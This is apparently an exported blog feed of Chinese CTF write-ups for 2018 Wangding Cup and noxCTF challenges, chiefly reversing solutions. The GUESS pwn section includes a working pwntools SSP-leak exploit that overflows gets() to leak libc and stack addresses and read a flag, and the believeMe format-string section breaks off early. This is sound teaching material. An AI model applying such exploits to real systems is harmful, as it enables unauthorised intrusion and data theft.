009d push 0x300a2 pop hi 2 00a4 subs_to_hi 0 20a6 push 0xa0ab pop hi 2 00ad cmp_hi_to_lo 0 20af j_flag_neg1 0x90b1 push 0x70b6 pop hi 2 00b8 subs_to_hi 0 20ba push 0x100bf pop hi 2 00c1 mul_to_hi 1 20c3 add_to_hi 1 00c5 jmp_bck_cnt 0x2b0c7 push 0x4a0b943f0cc pop hi 2 00ce cmp_hi_to_lo 1 20d0 xor_to_hi 0 00d2 j_not_flag 0x30d4 inc_assign_hi 0 00d6 return result0d7 push 0x70dc pop hi 3 00de xor_to_hi 1 10e0 dec_mem_ptr0e1 load_to_hi 0 00e3 push 0x300e8 pop hi 2 00ea subs_to_hi 0 20ec push 0xa0f1 pop hi 2 00f3 cmp_hi_to_lo 0 20f5 j_flag_neg1 0x90f7 push 0x70fc pop hi 2 00fe subs_to_hi 0 2100 push 0x10105 pop hi 2 0107 mul_to_hi 1 2109 add_to_hi 1 010b jmp_bck_cnt 0x2b10d push 0x7c5cdcec112 pop hi 2 0114 cmp_hi_to_lo 1 2116 xor_to_hi 0 0118 j_not_flag 0x311a inc_assign_hi 0 011c return result11d push 0x7122 pop hi 3 0124 xor_to_hi 1 1126 dec_mem_ptr127 load_to_hi 0 0129 push 0x3012e pop hi 2 0130 subs_to_hi 0 2132 push 0xa137 pop hi 2 0139 cmp_hi_to_lo 0 213b j_flag_neg1 0x913d push 0x7142 pop hi 2 0144 subs_to_hi 0 2146 push 0x1014b pop hi 2 014d mul_to_hi 1 214f add_to_hi 1 0151 jmp_bck_cnt 0x2b153 push 0x3929751b158 pop hi 2 015a cmp_hi_to_lo 1 215c xor_to_hi 0 015e j_not_flag 0x3160 inc_assign_hi 0 0162 return result163 push 0x7168 pop hi 3 016a xor_to_hi 1 116c dec_mem_ptr16d load_to_hi 0 016f push 0x30174 pop hi 2 0176 subs_to_hi 0 2178 push 0xa17d pop hi 2 017f cmp_hi_to_lo 0 2181 j_flag_neg1 0x9183 push 0x7188 pop hi 2 018a subs_to_hi 0 218c push 0x10191 pop hi 2 0193 mul_to_hi 1 2195 add_to_hi 1 0197 jmp_bck_cnt 0x2b199 push 0x1ef26b2d19e pop hi 2 01a0 cmp_hi_to_lo 1 21a2 xor_to_hi 0 01a4 j_not_flag 0x31a6 inc_assign_hi 0 01a8 return result1a9 push 0x71ae pop hi 3 01b0 xor_to_hi 1 11b2 dec_mem_ptr1b3 load_to_hi 0 01b5 push 0x301ba pop hi 2 01bc subs_to_hi 0 21be push 0xa1c3 pop hi 2 01c5 cmp_hi_to_lo 0 21c7 j_flag_neg1 0x91c9 push 0x71ce pop hi 2 01d0 subs_to_hi 0 21d2 push 0x101d7 pop hi 2 01d9 mul_to_hi 1 21db add_to_hi 1 01dd jmp_bck_cnt 0x2b1df push 0x838db52e1e4 pop hi 2 01e6 cmp_hi_to_lo 1 21e8 xor_to_hi 0 01ea j_not_flag 0x21ec inc_assign_hi 0 01ee return result 分析到090观察到下面都是类似的代码结构，之后直接还原flag就可以了，只需要把比较的十六进制字符串按端序从后往前拼接起来得到flag。 参考网站https://laucyun.com/3411bc6f400207178b85defa04474b4a.htmlhttps://spaces.ac.cn/archives/1907https://math.stackexchange.com/questions/1791562/converting-0-1-to-binary-64-bit-doublehttps://xz.aliyun.com/t/2897https://blog.csdn.net/qq_33438733/article/details/83044151","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://qianfei11.github.io/tags/ctf/"},{"name":"review","slug":"review","permalink":"https://qianfei11.github.io/tags/review/"}]},{"title":"2018-网鼎杯-review","slug":"2018-网鼎杯-review","date":"2018-09-12T13:00:45.000Z","updated":"2019-02-18T13:16:15.272Z","comments":true,"path":"2018/09/12/2018-网鼎杯-review/","link":"","permalink":"https://qianfei11.github.io/2018/09/12/2018-网鼎杯-review/","excerpt":"现阶段主要一直在做逆向，看了好几道逆向的wp复现一下。","text":"现阶段主要一直在做逆向，看了好几道逆向的wp复现一下。 REbeijing简单的异或，直接取原来的数据： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#include &lt;stdio.h&gt;unsigned char pair[28] = &#123; 0x61, 0x4C, 0x67, 0x59, 0x69, 0x29, 0x6E, 0x42, 0x62, 0x0D, 0x65, 0x71, 0x66, 0x34, 0x6A, 0xC6, 0x6D, 0x8A, 0x6C, 0x7F, 0x7B, 0xAE, 0x7A, 0x92, 0x7D, 0xEC, 0x5F, 0x57&#125;;unsigned int choice[22] = &#123; 0x6, 0x9, 0x0, 0x1, 0xA, 0x0, 0x8, 0x0, 0xB, 0x2, 0x3, 0x1, 0xD, 0x4, 0x5, 0x2, 0x7, 0x2, 0x3, 0x1, 0xC&#125;;int main() &#123; char tmp = 0; for(int i = 0; i &lt; 22; i++) &#123; switch(choice[i]) &#123; case 0: tmp = pair[2 * choice[i]]; break; case 1: tmp = pair[2 * choice[i]]; break; case 2: tmp = pair[2 * choice[i]]; break; case 3: tmp = pair[2 * choice[i]]; break; case 4: tmp = pair[2 * choice[i]]; break; case 5: tmp = pair[2 * choice[i]]; break; case 6: tmp = pair[2 * choice[i]]; break; case 7: tmp = pair[2 * choice[i]]; break; case 8: tmp = pair[2 * choice[i]]; break; case 9: tmp = pair[2 * choice[i]]; break; case 10: tmp = pair[2 * choice[i]]; break; case 11: tmp = pair[2 * choice[i]]; break; case 12: tmp = pair[2 * choice[i]]; break; case 13: tmp = pair[2 * choice[i]]; break; default: tmp = 0; break; &#125; printf(\"%c\", tmp); fflush(stdout); &#125; return 0;&#125; advanced非预期解，对加密了的字符串尝试异或就找到了规律： 12345678enc = 'K@LKVHr[DXEsLsYI@\\\\AMYIr\\\\EIZQ'flag = ''for i in range(len(enc)): if i &amp; 1: flag += chr(ord(enc[i]) ^ 0x2C) else: flag += chr(ord(enc[i]) ^ 0x2D)print flag blend和之前的一道题基本一样。file一下是MBR\b，可以用qemu跑一下。 1qemu-system-i386 -s -drive format=raw,file=./main.bin 通过gdb远程连接qemu进行动态调试： 123456789101112131415161718192021222324252627282930[Desktop] gdb 23:42:46 GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1Copyright (C) 2016 Free Software Foundation, Inc.License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;This is free software: you are free to change and redistribute it.There is NO WARRANTY, to the extent permitted by law. Type &quot;show copying&quot;and &quot;show warranty&quot; for details.This GDB was configured as &quot;x86_64-linux-gnu&quot;.Type &quot;show configuration&quot; for configuration details.For bug reporting instructions, please see:&lt;http://www.gnu.org/software/gdb/bugs/&gt;.Find the GDB manual and other documentation resources online at:&lt;http://www.gnu.org/software/gdb/documentation/&gt;.For help, type &quot;help&quot;.Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;.GEF for linux ready, type `gef&apos; to start, `gef config&apos; to configure65 commands loaded for GDB 7.11.1 using Python engine 3.5[*] 5 commands could not be loaded, run `gef missing` to know why.gef➤ set architecture i8086warning: A handler for the OS ABI &quot;GNU/Linux&quot; is not built into this configurationof GDB. Attempting to continue with the default i8086 settings.The target architecture is assumed to be i8086gef➤ set disassembly-flavor intelgef➤ target remote:1234Remote debugging using :12340x0000c073 in ?? ()[ Legend: Modified register | Code | Heap | Stack | String ]───────────────────────────────────────────────────────────────[ registers ]────[!] Command &apos;context&apos; failed to execute properly, reason: &apos;NoneType&apos; object has no attribute &apos;all_registers&apos; 或者在ida中静态分析，主要要了解一下sse指令： 指令 作用 MOVAPS 把源存储器内容值送入目的寄存器。当有m128时, 内存地址必须是16字节对齐的。 PSHUFD 有三个操作数，从左往右，第一个操作数是目的操作数保存结果，第二个操作数是源操作数，第三个操作数是一个8位立即数，指定以怎样的顺序将源操作数中数据保存到目的操作数。 ANDPS 按位与 PSADBW 绝对差值求和 先是判断字符串长度是否大于19： 然后在循环中逐个比较： 在循环中，主要是pshufd指令的操作： 123456780xffffffffffffff00 0xffffffffffffff000xffffffffffff00ff 0xffffffffffff00ff0xffffffffff00ffff 0xffffffffff00ffff0xffffffff00ffffff 0xffffffff00ffffff0xffffff00ffffffff 0xffffff00ffffffff0xffff00ffffffffff 0xffff00ffffffffff0xff00ffffffffffff 0xff00ffffffffffff0x00ffffffffffffff 0x00ffffffffffffff 然后与内存中的数据相与，再通过psadbw指令进行绝对差求和。 还有对高低位的一个位置交换： 123seg000:009F mov di, ds:1268hseg000:00A3 shl edi, 10hseg000:00A7 mov di, ds:1270h 最后用z3约束求解： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677from z3 import *s = Solver()a = Int('a') b = Int('b') c = Int('c') d = Int('d') e = Int('e') f = Int('f') g = Int('g') h = Int('h') i = Int('i') j = Int('j') k = Int('k') l = Int('l') m = Int('m') n = Int('n') o = Int('o') p = Int('p')s.add(a &lt; 127)s.add(b &lt; 127)s.add(c &lt; 127)s.add(d &lt; 127)s.add(e &lt; 127)s.add(f &lt; 127)s.add(g &lt; 127)s.add(h &lt; 127)s.add(i &lt; 127)s.add(j &lt; 127)s.add(k &lt; 127)s.add(l &lt; 127)s.add(m &lt; 127)s.add(n &lt; 127)s.add(o &lt; 127)s.add(p &lt; 127)s.add(a &gt; 32)s.add(b &gt; 32)s.add(c &gt; 32)s.add(d &gt; 32)s.add(e &gt; 32)s.add(f &gt; 32)s.add(g &gt; 32)s.add(h &gt; 32)s.add(i &gt; 32)s.add(j &gt; 32)s.add(k &gt; 32)s.add(l &gt; 32)s.add(m &gt; 32)s.add(n &gt; 32)s.add(o &gt; 32)s.add(p &gt; 32)s.add(abs(d-0x22)+abs(c-0xf)+abs(b-0x2)+abs(a-0xc8)+abs(h-0x83)+abs(g-0xfb)+abs(f-0xe0)+abs(0-0x83)==0x304)s.add(abs(p-0xc0)+abs(o-0x20)+abs(n-0xf)+abs(m-0x10)+abs(l-0xcd)+abs(k-0x00)+abs(j-0x13)+abs(0-0xb8)==0x311)s.add(abs(d-0x0)+abs(c-0x0)+abs(b-0x0)+abs(a-0x0)+abs(h-0x0)+abs(g-0x0)+abs(0-0x3)+abs(e-0x4)==0x2cd)s.add(abs(p-0x0)+abs(o-0x0)+abs(n-0x00)+abs(m-0x0)+abs(l-0x0)+abs(k-0x00)+abs(0-0x3)+abs(i-0x11)==0x2d9)s.add(abs(d-0x0)+abs(c-0x0)+abs(b-0x0)+abs(a-0x0)+abs(h-0x0)+abs(0-0x0)+abs(f-0x2)+abs(e-0xcd)==0x2db)s.add(abs(p-0x0)+abs(o-0x0)+abs(n-0x0)+abs(m-0x0)+abs(l-0x0)+abs(0-0x00)+abs(j-0x2)+abs(i-0xd9)==0x2d4)s.add(abs(d-0x0)+abs(c-0x0)+abs(b-0x0)+abs(a-0x0)+abs(0-0x0)+abs(g-0x0)+abs(f-0x2)+abs(e-0xdb)==0x2e2)s.add(abs(p-0x0)+abs(o-0x0)+abs(n-0x0)+abs(m-0x0)+abs(0-0x0)+abs(k-0x00)+abs(j-0x2)+abs(i-0xd4)==0x2c4)s.add(abs(d-0x0)+abs(c-0x0)+abs(b-0x0)+abs(0-0x0)+abs(h-0x0)+abs(g-0x0)+abs(f-0x2)+abs(e-0xe2)==0x2e2)s.add(abs(p-0x0)+abs(o-0x0)+abs(n-0x0)+abs(0-0x0)+abs(l-0x0)+abs(k-0x00)+abs(j-0x2)+abs(i-0xc4)==0x2ce)s.add(abs(d-0x0)+abs(c-0x0)+abs(0-0x0)+abs(a-0x0)+abs(h-0x0)+abs(g-0x0)+abs(f-0x2)+abs(e-0xe2)==0x2ed)s.add(abs(p-0x0)+abs(o-0x0)+abs(0-0x0)+abs(m-0x0)+abs(l-0x0)+abs(k-0x00)+abs(j-0x2)+abs(i-0xce)==0x2d8)s.add(abs(d-0x0)+abs(0-0x0)+abs(b-0x0)+abs(a-0x0)+abs(h-0x0)+abs(g-0x0)+abs(f-0x2)+abs(e-0xed)==0x2e8)s.add(abs(p-0x0)+abs(0-0x0)+abs(n-0x0)+abs(m-0x0)+abs(l-0x0)+abs(k-0x00)+abs(j-0x2)+abs(i-0xd8)==0x2dc)s.add(abs(0-0x0)+abs(c-0x0)+abs(b-0x0)+abs(a-0x0)+abs(h-0x0)+abs(g-0x0)+abs(f-0x2)+abs(e-0xe8)==0x2f6)s.add(abs(0-0x0)+abs(o-0x0)+abs(n-0x0)+abs(m-0x0)+abs(l-0x0)+abs(k-0x00)+abs(j-0x2)+abs(i-0xdc)==0x2dd)print s.check()model = s.model()ans = [model[a],model[b],model[c],model[d],model[e],model[f],model[g],model[h], model[i],model[j],model[k],model[l],model[m],model[n],model[o],model[p],0]print ansflag = ''.join([chr(int(str(x))) for x in ans])print flag PWNGUESS漏洞点很明显，gets处可以溢出： 123456789101112131415161718192021222324252627282930313233343536373839404142434445__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; __WAIT_STATUS stat_loc; // [rsp+14h] [rbp-8Ch] int v5; // [rsp+1Ch] [rbp-84h] __int64 v6; // [rsp+20h] [rbp-80h] __int64 v7; // [rsp+28h] [rbp-78h] char buf; // [rsp+30h] [rbp-70h] char s2; // [rsp+60h] [rbp-40h] unsigned __int64 v10; // [rsp+98h] [rbp-8h] v10 = __readfsqword(0x28u); v7 = 3LL; LODWORD(stat_loc.__uptr) = 0; v6 = 0LL; sub_4009A6(); HIDWORD(stat_loc.__iptr) = open(\"./flag.txt\", 0, a2); if ( HIDWORD(stat_loc.__iptr) == -1 ) &#123; perror(\"./flag.txt\"); _exit(-1); &#125; read(SHIDWORD(stat_loc.__iptr), &amp;buf, 0x30uLL); close(SHIDWORD(stat_loc.__iptr)); puts(\"This is GUESS FLAG CHALLENGE!\"); while ( 1 ) &#123; if ( v6 &gt;= v7 ) &#123; puts(\"you have no sense... bye :-) \"); return 0LL; &#125; v5 = sub_400A11(); // fork() if ( !v5 ) break; ++v6; wait((__WAIT_STATUS)&amp;stat_loc); &#125; puts(\"Please type your guessing flag\"); gets((__int64)&amp;s2); if ( !strcmp(&amp;buf, &amp;s2) ) puts(\"You must have great six sense!!!! :-o \"); else puts(\"You should take more effort to get six sence, and one more challenge!!\"); return 0LL;&#125; checksec后发现开了Canary。Canary检查失败的时候调用__stack_chk_fail： 12345void __attribute__ ((noreturn)) __stack_chk_fail (void) &#123; __fortify_fail (\"stack smashing detected\"); &#125; 其中的__fortify_fail打印出了__libc_argv[0]所指向字符串： 123456789void __attribute__ ((noreturn)) __fortify_fail (msg) const char *msg; &#123; /* The loop is added only to keep gcc happy. */ while (1) __libc_message (2, \"*** %s ***: %s terminated\\n\", msg, __libc_argv[0] ?: \"&lt;unknown&gt;\") &#125; libc_hidden_def (__fortify_fail) 可以通过覆盖__libc_argv[0]实现读取想要的数据，也就是SSP（Stack Smashing Protector） Leak。调试过程中有一个比较容易获取指针的方法： 12assassinq&gt;&gt; p &amp;__libc_argv[0]$1 = (char **) 0x7fffffffe4c8 然后因为libc导出了一个符号environ，其值和main函数的第三个参数envp一样。这样的话，只要泄漏出libc的基址就可以得到栈上的地址。 三次进程正好分为： 利用got表得到libc地址 利用libc的environ得到stack地址 计算flag地址并输出 exp： 12345678910111213141516171819202122232425262728293031323334353637383940#!/usr/bin/env pythonfrom pwn import *context.log_level = 'debug'local = 1if local: p = process('./guess')else: p = remote('106.75.90.160', 9999)elf = ELF('./guess')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')buf = 0x7fffffffe4d0argv_0 = 0x7fffffffe5f8offset1 = argv_0 - getsoffset2 = 0x7ffd12119a88 - 0x7ffd12119920gets_got = elf.got['gets'] # 0x602058# got ==&gt; libcp.recvuntil('flag\\n')payload = 'A' * offset1 + p64(gets_got)p.sendline(payload)p.recvuntil('***: ')gets_got = u64(sh.recv(6).ljust(8, '\\x00'))print hex(gets_got)libc_base = gets_got - libc.symbols['gets']libc.address = libc_baseprint hex(libc_base)# libc ==&gt; environ ==&gt; stackp.recvuntil('flag\\n')payload = 'A' * offset1 + p64(libc.symbols['environ'])p.sendline(payload)p.recvuntil('***: ')stack = u64(p.recv(6).ljust(8, '\\x00'))print hex(stack)# flagp.recvuntil('flag\\n')payload = 'B' * offset1 + p64(stack - offset2)p.sendline(payload)p.interactive() MISCminified取出Alpha0和Green0通道的图片后异或得到flag。 双色块先上binwalk得到图片，key为ctfer2333。 尝试把gif每一个帧拼凑成图片，发现无法得到一个正常的二维码。 再猜测将紫色与绿色色块分别表示\b1和0，先提取出每张图片： 123456789101112131415161718import osfrom PIL import Imagedef main(gif_file): png_dir = 'frame/' img = Image.open(gif_file) try: while True: current = img.tell() print current img.save(png_dir + str(current + 1) + '.png') img.seek(current + 1) except BaseException as e: print eif __name__ == '__main__': gif_file = 'out.gif' main(gif_file) 再读取图片内容，转换成0和1，最后每8位转为一个ascii字符： 123456789101112131415161718192021222324252627import osfrom PIL import Imagedef main(): png_dir = 'frame/' ret = '' for i in range(0, 24): line = '' for j in range(0, 24): file_name = 'frame/' + str(i * 24 + j + 1) + '.png' x = j * 10 + 5 y = i * 10 + 5 img = Image.open(file_name) img = img.convert('RGB') img_array = img.load() r, g, b = p = img_array[x, y] if g == 255: line += '0' if r == 255 and b == 255: line += '1' if len(line) == 8: ret += chr(int(line, 2)) line = '' print retif __name__ == '__main__': main() 去掉得到的字符串后面的hhhhh，因为明显不像加密后的内容，\b尝试base64无果后，用DES解密，密钥即为一开始得到的ctfer2333，得到flag。 welcome解压后用cat把所有的文件合并，得到一个zip文件，爆破密码得到flag。 CRYPTOshanghai维吉尼亚解密，在线解密，直接得到flag。 同时还得到密钥是icqvigenere。 apl之前PladCTF有一道类似的题目，在xman的时候也分析过。 apl最大的特点是从右往左计算。⍵代表右侧的变量，α代表左侧的变量。 一开始给了一长串base64字符串，解密后得到apl： 1&#123;⍵(~⍵)/(&apos;No_Please_continue&apos;)(&apos;Yes,This_is_flag&apos;)&#125;(∊(41(41)0+140)(⎕UCS(&apos;µě»ÕĀ$#Ğ$èáËĞĞĝ`âÞĠ#&quot;!Ġ&quot;KE(©$#Ğ$Q&lt;k&apos;))146)&#123;+/⍺≠33+2⊥(1(5)×8)⍴∊&#123;a≠8↑(1,a←(8⍴2)⊤⍵)&#125;¨2⊥8(+/⍴⍳(7*2)-⌊9.1⌊⍴&apos;FlagIsWhat&apos;)⍴10⊖⊖⌽(∊4(⍴⍴88888)+16)⍴(1+(|¯8)⍴1)⊤⎕UCS(⍵)&#125;&apos;YourFlagIsWhat?&apos; 先分成几个部分： 12. ```(∊(41(41)0+140)(⎕UCS(&apos;µě»ÕĀ$#Ğ$èáËĞĞĝ`âÞĠ#&quot;!Ġ&quot;KE(©$#Ğ$Q&lt;k&apos;))146)``` ==&gt; ```181 181 140 181 283 187 213 256 36 35 286 36 232 225 203 286 286 285 96 226 222 288 92 120 57 100 35 34 33 288 34 75 69 40 169 36 35 286 36 81 60 107 146 123456789101112131415再通过主要加密过程分析，根据apl的特性应该倒着来：1. `(1+(|¯8)⍴1)⊤⎕UCS(⍵)` ==&gt; 将ascii转换成二进制2. `(∊4(⍴⍴88888)+16)` ==&gt; 20 16，即将右侧的矩阵填充为20*163. `10⊖⊖⌽` ==&gt; 将矩阵的行倒序，列向上\b位移104. `8(⍴⍳(7*2)-⌊9.1⌊⍴&apos;FlagIsWhat&apos;)` ==&gt; 8 40，即将右侧的矩阵填充为8*405. `2⊥` ==&gt; 将二进制转换成ascii6. `&#123;a≠8↑(1,a←(8⍴2)⊤⍵)&#125;` ==&gt; x ^ (x &gt;&gt; 1)7. `+/⍺≠33+2⊥(1(5)×8)` ==&gt; `¨`按列读取矩阵，然后经过上一步的移位异或，转为ascii码并加上33接下来按步骤逆向即可：```apl⎕UCS(2⊥(8 40)⍴⌽⊖10⊖(20 16)⍴(8⍴2)⊤(106 202 104 193 192 206 201 100 192 194 204 194 75 200 206 106 193 75 192 201 201 194 75 206 196 98 206 75 196 192 201 108 198 204 100 193 46 40 35 38)) 参考网站https://www.jianshu.com/p/005bda1f8535https://www.anquanke.com/post/id/158386#h3-5https://xz.aliyun.com/t/2665https://mp.weixin.qq.com/s/d4KB9b83D5iiQAfNieqh3whttps://ihomura.cn/2018/08/23/WriteUp-%E7%BD%91%E9%BC%8E%E6%9D%AF%E6%95%99%E8%82%B2%E7%BB%84/https://github.com/TechSecCTF/writeups/tree/master/CSAWQuals2017/realismhttps://www.jianshu.com/p/005bda1f8535https://blog.csdn.net/whklhhhh/article/details/81950438https://xz.aliyun.com/t/2614https://blog.csdn.net/whklhhhh/article/details/82217266https://xz.aliyun.com/t/2666","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://qianfei11.github.io/tags/ctf/"},{"name":"review","slug":"review","permalink":"https://qianfei11.github.io/tags/review/"}]},{"title":"2018-noxCTF-writeup","slug":"2018-noxCTF-writeup","date":"2018-09-10T10:01:51.000Z","updated":"2018-11-11T05:02:54.378Z","comments":true,"path":"2018/09/10/2018-noxCTF-writeup/","link":"","permalink":"https://qianfei11.github.io/2018/09/10/2018-noxCTF-writeup/","excerpt":"记录几道简单题。","text":"记录几道简单题。 RE-GuessTheString把每个check分辨出来，然后逐一分析，先判断字符串长度： 1234_BOOL8 __fastcall check1(const char *a1)&#123; return strlen(a1) == 11;&#125; 判断每个字符是否都大于32： 12345678910__int64 __fastcall check2(_BYTE *s)&#123; char *v2; // [rsp+0h] [rbp-18h] _BOOL4 i; // [rsp+14h] [rbp-4h] v2 = s; for ( i = 1; i &amp;&amp; *v2; i = bigger_than_32(*v2++) ) ; return (unsigned int)i;&#125; 第一个字符不等于66且第一个字符与第二个字符的乘积为3478，可分解质因数求解： 123456789101112131415__int64 __fastcall check3(char *s)&#123; unsigned int v2; // [rsp+14h] [rbp-4h] v2 = 1; if ( *s == 66 ) &#123; v2 = 0; &#125; else if ( *s * s[1] != 3478 ) &#123; v2 = 0; &#125; return v2;&#125; 前三个数连续异或得到49: 123456789__int64 __fastcall check4(char *s)&#123; unsigned int v2; // [rsp+14h] [rbp-4h] v2 = 1; if ( ((unsigned __int8)(s[1] ^ *s) ^ (unsigned __int8)s[2]) != 49 ) v2 = 0; return v2;&#125; 第四个数大于第三个数，但是两者平方和相等，显然是溢出，在计算中通过模256（即0xFF）来实现： 12345678910111213141516__int64 __fastcall check5(char *s)&#123; unsigned int v2; // [rsp+14h] [rbp-4h] v2 = 1; if ( s[3] &gt; s[2] ) &#123; if ( s[2] * s[2] != s[3] * s[3] ) v2 = 0; &#125; else &#123; v2 = 0; &#125; return v2;&#125; 接下来还出现了一个检查素数的函数： 1234567891011121314151617181920212223__int64 __fastcall check_prime(char c)&#123; signed int i; // [rsp+Ch] [rbp-8h] unsigned int v3; // [rsp+10h] [rbp-4h] v3 = 1; if ( (unsigned __int8)c &gt; 1u ) &#123; if ( (unsigned __int8)c &gt; 2u ) &#123; for ( i = 2; v3 &amp;&amp; i &lt; (unsigned __int8)c; ++i ) &#123; if ( !((unsigned __int8)c % i) ) v3 = 0; &#125; &#125; &#125; else &#123; v3 = 0; &#125; return v3;&#125; 第五和第六个字符相互异或等于126： 1234567891011121314151617181920212223__int64 __fastcall check6(char *s)&#123; unsigned int v2; // [rsp+14h] [rbp-4h] v2 = 1; if ( (unsigned int)check_prime(s[4]) ) &#123; if ( (unsigned int)check_prime(s[5]) ) &#123; if ( ((unsigned __int8)s[4] ^ (unsigned __int8)s[5]) != 126 ) v2 = 0; &#125; else &#123; v2 = 0; &#125; &#125; else &#123; v2 = 0; &#125; return v2;&#125; 第七个字符的1/2是素数，且第七个字符等于第六个字符减去42的两倍： 12345678910111213141516__int64 __fastcall check7(char *s)&#123; unsigned int v2; // [rsp+14h] [rbp-4h] v2 = 1; if ( (unsigned int)check_prime(s[6] / 2) ) &#123; if ( s[6] != 2 * (s[5] - 42) ) v2 = 0; &#125; else &#123; v2 = 0; &#125; return v2;&#125; 第八个数字在(47, 57]范围内，右移两位后乘四等于本身： 1234567891011__int64 __fastcall check8(char *s)&#123; unsigned int v2; // [rsp+14h] [rbp-4h] v2 = 1; if ( s[7] &lt;= 47 || s[7] &gt; 57 ) v2 = 0; if ( 4 * (char)(s[7] &gt;&gt; 2) != s[7] ) v2 = 0; return v2;&#125; 传入\b数字与第八个字符异或得到第九个字符： 1234_BOOL8 __usercall check9@&lt;rax&gt;(unsigned __int8 a1@&lt;efl&gt;, __int64 a2, char *s)&#123; return s[8] == (a1 ^ (unsigned __int8)s[7]);&#125; 两倍关系： 123456789__int64 __fastcall check10(char *a1)&#123; unsigned int v2; // [rsp+14h] [rbp-4h] v2 = 1; if ( 2 * a1[8] != a1[9] ) v2 = 0; return v2;&#125; 计算得出第十一个数字： 123456789101112_BOOL8 __fastcall check11(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6, __int64 a7, char *a8)&#123; __int64 v8; // rcx __int16 sum; // ax v8 = (unsigned __int8)a8[9]; sum = 0; do sum += v8--; while ( v8 ); return a8[10] == HIBYTE(sum) * (_BYTE)sum;&#125; 逻辑相对比较常规，但做下来有些耗时。最后写出脚本： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647primes = []for i in range(2, 256): for j in range(2, i): if i % j == 0: break else: primes.append(i)s = 11 * [0]# s[0], s[1] = 37, 94 # %^Jv!_j0\"Dz ==&gt; wrongs[0], s[1] = 47, 74 # /JTl!_j0\"Dz ==&gt; rightassert(s[0] * s[1] == 3478)s[2] = s[0] ^ s[1] ^ 49for i in range(s[2] + 1, 256): if i * i % 256 == s[2] * s[2] % 256: s[3] = i breakdef get456(): for i in primes: for j in primes: if i &gt; 32 and j &gt; 32 and (i ^ j) % 256 == 126: if j - 42 in primes and 2 * j &lt; 256: return (i, j, 2 * (j - 42))s[4], s[5], s[6] = get456()for i in range(48, 58): if 4 * (i &gt;&gt; 2) == i: s[7] = i breaks[8] = 0x12 ^ s[7]s[9] = 2 * s[8]s[10] = 0x7Afor c in s: assert(c &gt; 32)print(''.join(map(chr, s))) 据说这里可以符号执行用angr做。 MISC-Blind Datexxd一下文件头，根据jpeg文件头特征可以发现每四字节被倒过来了： 1234567891011~ &gt; xxd BlindDate.jpeg | head00000000: e0ff d8ff 464a 1000 0100 4649 6000 0101 ....FJ....FI`...00000010: 0000 6000 2200 e1ff 6669 7845 4d4d 0000 ..`.\"...fixEMM..00000020: 0000 2a00 0100 0800 0300 1201 0100 0000 ..*.............00000030: 0000 0100 0000 0000 1100 ecff 6b63 7544 ............kcuD00000040: 0001 0079 0000 0004 ff00 004b 687e 03e1 ...y.......Kh~..00000050: 3a70 7474 736e 2f2f 6f64 612e 632e 6562 :pttsn//oda.c.eb00000060: 782f 6d6f 312f 7061 002f 302e 7078 3f3c x/mo1/pa./0.px?&lt;00000070: 656b 6361 6562 2074 3d6e 6967 bfbb ef22 ekcaeb t=nig...\"00000080: 6469 2022 3557 223d 704d 304d 6968 6543 di \"5W\"=pM0MiheC00000090: 6572 7a48 544e 7a53 636b 7a63 3f22 6439 erzHTNzSckzc?\"d9 用脚本过逆回来： 12345678910f = open('BlindDate.jpeg', 'rb')s = f.read()f.close()data = ''for i in range(0, len(s), 4): data += s[i:i + 4][::-1]new_f = open('re_BlindData.jpeg', 'wb')new_f.write(data) strings一下新文件，发现一串base64字符串： 1Li4gICAuICAuLiAgLi4gICAuICAuLiAgLi4gICAuICAuLiAgLiAgLi4NCi4gICAgLiAgIC4gICAgICAgLiAgICAgIC4gICAgLiAgIC4gIC4gIA0KICAgIC4uICAgICAgICAgIC4uICAgICAgLiAgIC4uICAgICAgLiAgLgPK 解开后发现是盲文： 123.. . .. .. . .. .. . .. . ... . . . . . . . .. .. . .. . . 翻译一下之后是：F4C3P4LM binwalk一下新文件，分解出一个带密码的7z压缩文件。把上面的字符串作为密码解开，得到flag文本，是brainfuck： 1++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++++++++++.+.+++++++++.&lt;---.+++++++++++++++++.--------------.&gt;+++.&lt;+++++++++++++++++.&lt;++++++++++++++++++.&gt;&gt;------.---------.--------.-----.++++++++++++++++++++++++++.&lt;&lt;.&gt;&gt;----.&lt;++++++++.+++.&gt;---------.&lt;&lt;+.&gt;&gt;++.&lt;++.-----.+++++.&lt;+++.&gt;&gt;++++++.&lt;&lt;-.&gt;-----.&lt;+.&gt;.+++.&gt;--------.&lt;&lt;---.&gt;&gt;++.&lt;++.-----.+++++.&lt;+++.&gt;&gt;++++++.&lt;&lt;-.++++++++++++.&gt;&gt;+++++++++.&lt;&lt;&lt;++++++++++++++++++++++. 解密得到flag：noxCTF{W0uld_y0u_bl1nd_d4t3_4_bl1nd_d4t3?} PWN-believeMe做出的第一道格式化字符串。拿到题目先\bfile\b一下，然后再看看开了什么保护： 123456789[noxCTF-believeMe] file believeMe 1:36:01 believeMe: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=03d2b6bcc0a0fdbab80a9852cab1d201437e7e30, not stripped[noxCTF-believeMe] checksec believeMe 1:36:06 [*] '/home/assassinq/Desktop/pwn/format string/noxCTF-believeMe/believeMe' Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) 然后拖进ida中查看： 1234567891011121314int __cdecl main(int argc, const char **argv, const char **envp)&#123; char s[40]; // [esp+14h] [ebp-34h] unsigned int v5; // [esp+3Ch] [ebp-Ch] v5 = __readgsdword(0x14u); puts(aSomeoneToldMeT); fflush(stdout); fgets(s, 39, stdin); s[strcspn(s, \"\\n\")] = 0; printf(s); fflush(stdout); return 0;&#125; 